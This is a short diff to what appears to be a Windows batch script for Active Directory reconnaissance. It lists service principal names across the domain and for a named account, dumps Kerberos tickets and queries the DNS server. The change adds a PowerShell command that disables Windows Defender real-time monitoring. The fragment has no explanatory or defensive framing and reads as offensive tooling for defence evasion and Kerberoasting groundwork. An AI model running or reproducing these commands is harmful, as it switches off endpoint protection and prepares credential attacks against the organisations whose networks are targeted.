@@ -535,6 +535,8 @@ setspn -L abc.local\johnwick
 ECHO ============================
 klist
 ECHO ============================
+cmd.exe powershell Set-MpPreference -DisableRealtimeMonitoring $true
+ECHO ============================
 ECHO | nslookup | findstr "Default\ Server"
 ECHO ============================
 setspn -T * -Q */* > Spnlist.txt
